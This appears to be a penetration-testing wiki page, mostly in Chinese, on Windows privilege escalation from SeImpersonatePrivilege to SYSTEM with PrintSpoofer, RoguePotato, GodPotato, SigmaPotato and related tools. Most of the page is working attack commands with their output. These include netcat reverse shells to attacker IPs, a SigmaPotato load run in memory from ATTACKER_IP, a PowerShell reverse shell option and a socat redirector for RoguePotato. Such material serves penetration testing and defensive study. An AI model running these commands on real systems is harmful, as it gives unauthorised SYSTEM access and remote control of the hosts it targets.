# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 不再适用于 Windows Server 2019 和 Windows 10 build 1809 及更高版本。** 然而， [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 可以用于 **利用相同的权限并获取 `NT AUTHORITY\SYSTEM` 级别访问。** 这篇 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 深入介绍了 `PrintSpoofer` 工具，可用于在 JuicyPotato 无法工作的 Windows 10 和 Server 2019 主机上滥用 impersonation 权限。

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要求和常见陷阱

下列技术都依赖于从具有以下任一特权的上下文中滥用具备 impersonation 能力的特权服务：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果 token 已经具有 SeImpersonatePrivilege，则不需要高完整性（这在许多服务账户中很常见，例如 IIS AppPool、MSSQL 等）

快速检查特权：
```cmd
whoami /priv | findstr /i impersonate
```
操作说明：

- 如果你的 shell 在受限令牌下运行且缺少 SeImpersonatePrivilege（在某些情况下常见于 Local Service/Network Service），先用 FullPowers 恢复该帐户的默认权限，然后再运行一个 Potato。例：`FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer 需要 Print Spooler 服务正在运行并可通过本地 RPC 端点 (spoolss) 访问。在 PrintNightmare 后 Spooler 被禁用的加固环境中，优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 需要可通过 TCP/135 访问的 OXID resolver。如果出口被阻断，使用 redirector/port-forwarder（见下面示例）。旧版本需要 -f 参数。
- EfsPotato/SharpEfsPotato 滥用 MS-EFSR；如果某个 pipe 被阻塞，尝试其他 pipe（lsarpc、efsrpc、samr、lsass、netlogon）。
- 在 RpcBindingSetAuthInfo 期间出现错误 0x6d3 通常表示未知/不受支持的 RPC 认证服务；尝试使用不同的 pipe/transport，或确保目标服务正在运行。

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 可以使用 -i 在当前控制台启动一个交互式进程，或使用 -c 运行单行命令。
- 需要 Spooler service。如果被禁用，将会失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果出站端口 135 被阻止，使用 socat 在你的 redirector 上 pivot OXID resolver：
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato 是一个较新的 COM 滥用原语，于 2022 年末发布，针对 **PrintNotify** 服务而不是 Spooler/BITS。该二进制实例化 PrintNotify COM 服务器，替换入一个伪造的 `IUnknown`，然后通过 `CreatePointerMoniker` 触发特权回调。当 PrintNotify 服务（以 **SYSTEM** 身份运行）连接回时，进程会复制返回的 token 并以完整权限启动提供的 payload。

关键操作说明：

* 适用于 Windows 10/11 和 Windows Server 2012–2022，只要安装了 Print Workflow/PrintNotify 服务（即使在 PrintNightmare 之后禁用传统 Spooler 时该服务仍然存在）。
* 要求调用上下文拥有 **SeImpersonatePrivilege**（典型场景为 IIS APPPOOL、MSSQL 和计划任务服务账户）。
* 接受直接命令或交互模式，因此你可以停留在原始控制台内。示例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 由于它完全基于 COM，不需要命名管道监听器或外部重定向器，这使其在 Defender 阻止 RoguePotato 的 RPC 绑定的主机上可以直接替代。

像 Ink Dragon 这样的运营者在通过 ViewState RCE 在 SharePoint 上获得 RCE 后会立即触发 PrintNotifyPotato，以便在安装 ShadowPad 之前将 `w3wp.exe` 工作进程提升到 SYSTEM。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果某个 pipe 失败或被 EDR 阻止，请尝试其他受支持的 pipes：
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意：
- 在 Windows 8/8.1–11 和 Server 2012–2022 上有效，当存在 SeImpersonatePrivilege 时。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供两个变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。构建或使用提供的二进制文件并运行你的命令：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新的 GodPotato 分支)

SigmaPotato 增加了诸如通过 .NET reflection 实现的内存执行和 PowerShell reverse shell helper 的现代便利功能。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 参考资料

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
